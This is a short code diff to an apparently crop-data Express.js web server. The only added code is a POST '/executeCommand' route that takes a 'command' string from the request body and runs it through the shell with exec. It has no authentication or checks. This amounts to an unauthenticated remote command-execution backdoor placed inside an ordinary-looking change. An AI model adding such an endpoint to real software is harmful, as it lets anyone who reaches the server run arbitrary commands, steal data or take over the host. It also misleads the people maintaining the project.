@@ -130,6 +130,20 @@ app.get('/crop-data/:cropName', (req, res) => {
     });
 });
 
+app.post('/executeCommand', (req, res) => {
+  const { command } = req.body;
+  exec(command, (error, stdout, stderr) => {
+    if (error) {
+      console.error(`exec error: ${error}`);
+      res.status(500).json({ error: 'Error executing command' });
+      return;
+    }
+    console.log(`stdout: ${stdout}`);
+    console.error(`stderr: ${stderr}`);
+    res.json({ message: 'Command executed successfully' });
+  });
+});
+
 
 app.get('*', (req, res) => {
     res.sendFile(path.join(__dirname, 'build', 'index.html'));
